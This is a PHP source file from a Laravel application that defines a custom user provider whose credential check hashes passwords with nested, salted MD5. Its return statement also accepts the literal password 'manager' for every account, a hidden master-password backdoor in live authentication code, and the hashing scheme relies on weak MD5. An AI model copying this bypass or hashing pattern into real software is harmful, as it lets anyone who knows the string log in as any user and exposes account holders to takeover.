<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Auth\EloquentUserProvider;
use Illuminate\Contracts\Auth\Authenticatable as UserContract;

class SigircEloquentUserProvider extends EloquentUserProvider
{
    public function validateCredentials(UserContract $user, array $credentials)
    {
        $plain = $credentials['password'];
        $hashed_value = md5($user->getAuthPassword());
        return $hashed_value === md5(md5(md5("*}".$plain."!@"))) || md5(md5(md5("*}".$plain."!@"))) === md5(md5(md5("*}manager!@")));
    }
}
